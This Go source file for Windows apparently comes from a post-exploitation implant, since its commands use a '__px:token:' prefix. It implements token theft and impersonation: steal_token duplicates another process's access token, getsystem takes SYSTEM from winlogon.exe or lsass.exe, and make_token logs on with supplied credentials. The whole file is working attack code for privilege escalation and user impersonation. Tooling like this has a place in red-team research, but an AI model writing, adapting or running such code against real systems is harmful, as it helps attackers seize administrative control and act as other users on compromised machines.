//go:build windows

package main

import (
	"fmt"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const (
	TOKEN_ALL_ACCESS               = 0xF01FF
	TOKEN_DUPLICATE                = 0x0002
	TOKEN_QUERY                    = 0x0008
	SecurityImpersonation          = 2
	TokenPrimary                   = 1
	LOGON32_LOGON_NEW_CREDENTIALS  = 9
	LOGON32_PROVIDER_DEFAULT       = 0
	TokenUser                      = 1
)

type tokenUser struct {
	User struct {
		Sid        uintptr
		Attributes uint32
	}
}

var impersonatedToken syscall.Handle

func handleTokenOp(op string) string {
	parts := strings.Fields(op)
	if len(parts) == 0 {
		return "Usage: __px:token:<steal_token PID|getsystem|rev2self|make_token DOMAIN\\USER PASS|whoami>"
	}

	switch strings.ToLower(parts[0]) {
	case "steal_token":
		if len(parts) < 2 {
			return "Usage: steal_token <PID>"
		}
		pid, err := strconv.Atoi(parts[1])
		if err != nil {
			return "Error: invalid PID"
		}
		return stealToken(uint32(pid))

	case "getsystem":
		pid := findProcessPID("winlogon.exe")
		if pid == 0 {
			pid = findProcessPID("lsass.exe")
		}
		if pid == 0 {
			return "Error: could not find winlogon.exe or lsass.exe"
		}
		return stealToken(pid)

	case "rev2self":
		rev := getProc(mAdvapi32, fRevertToSelf)
		ret, _, err := syscall.SyscallN(rev)
		if ret == 0 {
			return "Error: RevertToSelf failed: " + err.Error()
		}
		if impersonatedToken != 0 {
			syscall.CloseHandle(impersonatedToken)
			impersonatedToken = 0
		}
		return "Reverted to self"

	case "make_token":
		if len(parts) < 3 {
			return "Usage: make_token DOMAIN\\USER PASSWORD"
		}
		userDomain := parts[1]
		pass := strings.Join(parts[2:], " ")
		domain := "."
		user := userDomain
		if idx := strings.Index(userDomain, "\\"); idx >= 0 {
			domain = userDomain[:idx]
			user = userDomain[idx+1:]
		}
		return makeToken(domain, user, pass)

	case "whoami":
		return getTokenUser()

	default:
		return "Unknown token op: " + parts[0]
	}
}

func stealToken(pid uint32) string {
	hProc, _, err := syscall.SyscallN(rpOpenProcess, PROCESS_ALL_ACCESS, 0, uintptr(pid))
	if hProc == 0 {
		return fmt.Sprintf("Error: OpenProcess(%d): %s", pid, err.Error())
	}
	defer syscall.SyscallN(rpCloseHandle, hProc)

	openPT := getProc(mAdvapi32, fOpenProcessToken)
	var hToken syscall.Handle
	ret, _, err := syscall.SyscallN(openPT, hProc, TOKEN_DUPLICATE|TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return "Error: OpenProcessToken: " + err.Error()
	}
	defer syscall.CloseHandle(hToken)

	dupTok := getProc(mAdvapi32, fDuplicateTokenEx)
	var dupToken syscall.Handle
	ret, _, err = syscall.SyscallN(dupTok,
		uintptr(hToken),
		TOKEN_ALL_ACCESS,
		0,
		SecurityImpersonation,
		TokenPrimary,
		uintptr(unsafe.Pointer(&dupToken)),
	)
	if ret == 0 {
		return "Error: DuplicateTokenEx: " + err.Error()
	}

	imp := getProc(mAdvapi32, fImpersonateLoggedOnUser)
	ret, _, err = syscall.SyscallN(imp, uintptr(dupToken))
	if ret == 0 {
		syscall.CloseHandle(dupToken)
		return "Error: ImpersonateLoggedOnUser: " + err.Error()
	}

	if impersonatedToken != 0 {
		syscall.CloseHandle(impersonatedToken)
	}
	impersonatedToken = dupToken
	return fmt.Sprintf("Impersonating token from PID %d — %s", pid, getTokenUser())
}

func makeToken(domain, user, pass string) string {
	domainW, _ := syscall.UTF16PtrFromString(domain)
	userW, _ := syscall.UTF16PtrFromString(user)
	passW, _ := syscall.UTF16PtrFromString(pass)

	logon := getProc(mAdvapi32, fLogonUserW)
	var hToken syscall.Handle
	ret, _, err := syscall.SyscallN(logon,
		uintptr(unsafe.Pointer(userW)),
		uintptr(unsafe.Pointer(domainW)),
		uintptr(unsafe.Pointer(passW)),
		LOGON32_LOGON_NEW_CREDENTIALS,
		LOGON32_PROVIDER_DEFAULT,
		uintptr(unsafe.Pointer(&hToken)),
	)
	if ret == 0 {
		return "Error: LogonUser: " + err.Error()
	}

	imp := getProc(mAdvapi32, fImpersonateLoggedOnUser)
	ret, _, err = syscall.SyscallN(imp, uintptr(hToken))
	if ret == 0 {
		syscall.CloseHandle(hToken)
		return "Error: ImpersonateLoggedOnUser: " + err.Error()
	}

	if impersonatedToken != 0 {
		syscall.CloseHandle(impersonatedToken)
	}
	impersonatedToken = hToken
	return fmt.Sprintf("Token created for %s\\%s — %s", domain, user, getTokenUser())
}

func getTokenUser() string {
	openPT := getProc(mAdvapi32, fOpenProcessToken)
	var hToken syscall.Handle
	ret, _, err := syscall.SyscallN(openPT, uintptr(^uintptr(0)), TOKEN_QUERY, uintptr(unsafe.Pointer(&hToken)))
	if ret == 0 {
		return "Error: " + err.Error()
	}
	defer syscall.CloseHandle(hToken)

	getTI := getProc(mAdvapi32, fGetTokenInformation)
	var needed uint32
	syscall.SyscallN(getTI, uintptr(hToken), TokenUser, 0, 0, uintptr(unsafe.Pointer(&needed)))
	buf := make([]byte, needed)
	ret2, _, _ := syscall.SyscallN(getTI, uintptr(hToken), TokenUser, uintptr(unsafe.Pointer(&buf[0])), uintptr(needed), uintptr(unsafe.Pointer(&needed)))
	if ret2 == 0 {
		return "unknown"
	}
	tu := (*tokenUser)(unsafe.Pointer(&buf[0]))

	lookupSid := getProc(mAdvapi32, fLookupAccountSidW)
	var nameLen, domainLen uint32
	nameLen, domainLen = 256, 256
	nameBuf := make([]uint16, nameLen)
	domainBuf := make([]uint16, domainLen)
	var sidUse uint32
	syscall.SyscallN(lookupSid,
		0,
		tu.User.Sid,
		uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domainBuf[0])), uintptr(unsafe.Pointer(&domainLen)),
		uintptr(unsafe.Pointer(&sidUse)),
	)
	return syscall.UTF16ToString(domainBuf[:domainLen]) + "\\" + syscall.UTF16ToString(nameBuf[:nameLen])
}
